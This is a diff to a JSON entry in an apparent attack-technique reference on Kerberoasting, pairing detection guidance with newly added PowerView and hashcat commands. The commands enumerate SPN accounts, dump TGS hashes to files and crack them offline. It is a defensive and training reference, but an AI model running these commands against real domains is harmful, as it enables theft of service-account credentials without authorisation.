@@ -67,7 +67,7 @@
     }
   ],
   "defense": {
-    "why_it_works": "PowerView Get-DomainSPNTicket (or Invoke-Kerberoast) requests a TGS for an SPN account and outputs the crackable hash.",
+    "why_it_works": "Requesting a TGS for an SPN returns a ticket encrypted with the service account's NT hash; PowerView formats it for hashcat. Works for any user because TGS issuance isn't privileged.",
     "prerequisites": "Valid domain credentials and PowerView in the session.",
     "impact": "A crackable TGS hash for the targeted service account.",
     "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition.",
@@ -84,5 +84,29 @@
   },
   "tools": [
     "PowerView"
+  ],
+  "variations": [
+    {
+      "label": "All SPN users at once",
+      "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv hashes.csv -NoTypeInformation"
+    },
+    {
+      "label": "Single user",
+      "command": "Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat | fl"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find SPN accounts",
+      "command": "Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname"
+    },
+    {
+      "label": "Request TGS in hashcat format",
+      "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | select -Expand Hash > hashes.txt"
+    },
+    {
+      "label": "Crack offline",
+      "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
+    }
   ]
 }
